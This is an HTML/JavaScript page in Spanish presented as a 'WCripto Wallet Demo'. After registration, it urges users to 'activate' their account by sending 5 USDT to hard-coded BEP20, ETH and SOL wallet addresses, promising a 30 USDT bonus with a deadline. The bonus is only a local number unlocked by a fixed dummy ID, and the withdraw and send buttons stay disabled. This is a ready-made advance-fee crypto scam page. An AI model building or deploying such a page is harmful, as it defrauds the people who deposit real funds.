<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WCripto Wallet Demo</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Roboto',sans-serif;background:#0f1226;color:#fff;line-height:1.5}
.hidden{display:none}
.container{max-width:420px;margin:20px auto;padding:20px;border-radius:18px;background:rgba(0,0,0,.35);box-shadow:0 20px 40px rgba(0,0,0,.5)}
h2,h3{text-align:center;margin-bottom:12px}
input,select,button{width:100%;padding:12px;margin:6px 0;border-radius:14px;border:none;font-size:15px}
button{cursor:pointer;font-weight:700;transition:.2s}
button:hover{opacity:.9}
input,select{background:#2a2f55;color:#fff}
.balance{font-size:26px;font-weight:700;color:#00ffcc;text-align:center;margin-bottom:6px}
.info{text-align:center;color:#ccc;margin-bottom:10px}
.actions{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:15px 0}
.actions button{border-radius:50%;padding:18px 0;font-size:12px}
.asset{background:#242852;padding:12px;border-radius:14px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center}
.toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#00d2a8;padding:14px 22px;border-radius:14px;display:none;font-weight:700;z-index:999}
.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.6);display:none;justify-content:center;align-items:center;z-index:998}
.modal{background:#1b1f3a;padding:20px;border-radius:18px;width:90%;max-width:360px;position:relative}
.close{position:absolute;top:10px;right:14px;font-weight:700;cursor:pointer}
.copy-btn{margin-top:6px;background:#00ffcc;color:#000;font-weight:700;border-radius:10px;cursor:pointer;padding:6px;font-size:12px}
body.dark{background:#0a0c1a;color:#fff}
@media(max-width:480px){.container{margin:10px;padding:15px}}
</style>
</head>
<body class="dark">
<div class="toast" id="toast"></div>

<!-- AUTENTICACIÓN -->
<div class="container" id="auth">
  <h2>WCripto Wallet Demo</h2>
  <!-- Registro -->
  <div id="registerForm">
    <input id="fname" placeholder="Nombre" required>
    <input id="lname" placeholder="Apellido" required>
    <input id="emailReg" placeholder="Email" required>
    <input id="passwordReg" type="password" placeholder="Contraseña" required>
    <input id="confirmReg" type="password" placeholder="Confirmar Contraseña" required>
    <button id="registerBtn">Registrarse</button>
    <p style="text-align:center;color:#ccc;font-size:12px;cursor:pointer" onclick="showLogin()">¿Ya tienes cuenta? Inicia sesión</p>
  </div>
  <!-- Login -->
  <div id="loginForm" class="hidden">
    <input id="emailLogin" placeholder="Email" required>
    <input id="passwordLogin" type="password" placeholder="Contraseña" required>
    <button id="loginBtn">Iniciar sesión</button>
    <p style="text-align:center;color:#ccc;font-size:12px;cursor:pointer" onclick="showRegister()">¿No tienes cuenta? Regístrate</p>
  </div>
</div>

<!-- DASHBOARD -->
<div class="container hidden" id="dash">
  <h2>Mi Wallet - <span id="userName"></span></h2>
  <div class="balance" id="balance">0 USDT</div>
  <div class="info" id="activationMsg">RECIBE UN BONO DE TREINTA USDT LISTOS PARA RETIRARLOS O ENVIÁRSELO A OTRA PERSONA TRAS ACTIVAR LA CUENTA CON UNA RECARGA MÍNIMA DE 5 USDT</div>

  <div class="actions">
    <button disabled>Recibir</button>
    <button disabled>Enviar</button>
    <button disabled>Comprar</button>
    <button disabled>Vender</button>
    <button disabled>Swap</button>
    <button disabled>Invertir</button>
  </div>

  <h3>Recargar USDT</h3>
  <select id="networkSelect">
    <option value="">Selecciona la red</option>
    <option value="BEP20">BEP20 - 0x3670a0bffb8b8a6d42177807f8dfd369a3995b9e</option>
    <option value="ETH">ETH - 0x3670a0bffb8b8a6d42177807f8dfd369a3995b9e</option>
    <option value="SOL">SOL - 5xuPYYDv4MDDD8XZNkHKkBWwyKWKRd9jqcLuVNfeuzVR</option>
  </select>
  <input id="rechargeAmt" type="number" value="5" readonly>
  <button id="rechargeBtn">Recargar y Activar</button>

  <div id="transferDiv" class="hidden">
    <p>Pega aquí tu ID de transferencia para validar:</p>
    <input id="transferId" placeholder="ID de transferencia">
    <button id="validateBtn">Validar</button>
  </div>

</div>

<script>
// Mostrar login/registro
function showLogin(){document.getElementById("registerForm").classList.add("hidden");document.getElementById("loginForm").classList.remove("hidden");}
function showRegister(){document.getElementById("loginForm").classList.add("hidden");document.getElementById("registerForm").classList.remove("hidden");}

// Toast
function toast(msg){const x=document.getElementById("toast");x.innerText=msg;x.style.display="block";setTimeout(()=>x.style.display="none",2200);}

// Storage simple demo
async function hashPass(str){const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(str));return Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('');}
function saveUser(u){let users = JSON.parse(localStorage.getItem("users")||"[]"); const idx = users.findIndex(x=>x.email===u.email); if(idx>=0) users[idx]=u; else users.push(u); localStorage.setItem("users", JSON.stringify(users));}
function loadUser(email){let users = JSON.parse(localStorage.getItem("users")||"[]"); return users.find(u=>u.email===email);}
function currentUserEmail(){return localStorage.getItem("currentUser");}

// Registro
document.getElementById("registerBtn").onclick=async function(){
  const fname=document.getElementById("fname").value.trim();
  const lname=document.getElementById("lname").value.trim();
  const email=document.getElementById("emailReg").value.trim().toLowerCase();
  const pass=document.getElementById("passwordReg").value.trim();
  const confirm=document.getElementById("confirmReg").value.trim();
  if(!fname||!lname||!email||!pass||!confirm){toast("Completa todos los campos");return;}
  if(pass!==confirm){toast("Contraseñas no coinciden");return;}
  const hashedPass=await hashPass(pass);
  const user={fname,lname,email,pass:hashedPass,activated:false,balance:0};
  saveUser(user);
  localStorage.setItem("currentUser",email);
  showDashboard(user);
  toast("Cuenta creada, recarga para activar el bono");
}

// Login
document.getElementById("loginBtn").onclick=async function(){
  const email=document.getElementById("emailLogin").value.trim().toLowerCase();
  const pass=document.getElementById("passwordLogin").value.trim();
  const u=loadUser(email);
  if(!u){toast("Usuario no encontrado"); return;}
  const hashedPass=await hashPass(pass);
  if(u.pass!==hashedPass){toast("Contraseña incorrecta"); return;}
  localStorage.setItem("currentUser",email);
  showDashboard(u);
  toast("Bienvenido "+u.fname);
}

// Mostrar dashboard
function showDashboard(u){
  document.getElementById("auth").classList.add("hidden");
  document.getElementById("dash").classList.remove("hidden");
  document.getElementById("userName").innerText = u.fname + " " + u.lname;
  document.getElementById("balance").innerText = u.balance + " USDT";
  document.getElementById("activationMsg").innerText = u.activated 
    ? "Cuenta activada ✅" 
    : "INFORMACIÓN IMPORTANTE VALIDA TU CUENTA CON 5 USDT Y RECIBE UN BONO DE 30 USDT. NUESTRA OFERTA FINALIZA EL DÍA 22/2/26. NOTA LOS USUARIOS QUE AUN NO HAN RECIBIDO SU CÓDIGO DE ACTIVACIÓN LO ESTARÁN RECIBIENDO EN BREVE.ESTAMOS TRABAJANDO PARA OFRECER EL MEJOR SERVICIO";
}

// Recarga y activación
document.getElementById("rechargeBtn").onclick=function(){
  const network=document.getElementById("networkSelect").value;
  if(!network){toast("Selecciona la red"); return;}
  document.getElementById("transferDiv").classList.remove("hidden");
  toast("Recarga iniciada en "+network+". Pega el ID para validar");
}

// Validar ID de transferencia
document.getElementById("validateBtn").onclick=function(){
  const id=document.getElementById("transferId").value.trim();
  if(id!=="Abcdefghijk"){toast("ID incorrecto"); return;}
  const u=loadUser(currentUserEmail());
  u.activated=true;
  u.balance=30; // Bono de 30 USDT
  saveUser(u);
  showDashboard(u);
  toast("Recarga validada. Cuenta activada y bono recibido!");
}
</script>
</body>
</html>
